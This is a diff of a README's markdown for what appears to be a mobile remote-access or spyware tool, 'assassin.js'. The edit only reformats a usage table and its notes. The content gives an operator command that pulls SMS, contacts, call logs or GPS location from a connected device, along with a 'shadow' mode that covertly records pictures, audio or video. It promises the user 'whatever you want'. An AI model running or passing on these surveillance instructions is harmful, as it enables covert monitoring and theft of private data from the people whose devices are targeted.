@@ -77,9 +77,10 @@ and get your server IPAdress by "ifconfig/ipconfig"
 ### *Step.3 execute command，then you will get whaterver you want!!!*
 | cmd        |  ./assassin.js -a sms -c 9910294050493  |
 | ---------- | :-----------:  |
-| description| select the command between [sms,contacts,call,gps,shadow]  if you choose the shadow you should also use -t to choose a type between pic/audio/video     |
-***args with -c can be gotten at server terminal {a user connected info}***
-***type the cmd into a new terminal at ~/project/Server***
+| description| select the command between [sms,contacts,call,gps,shadow]  if you choose the shadow you should also use -t to choose a type between pic/audio/video|
+
+#### ***args with -c can be gotten at server terminal {a user connected info}***
+#### ***type the cmd into a new terminal at ~/project/Server***
 and the result:
 ```
 {
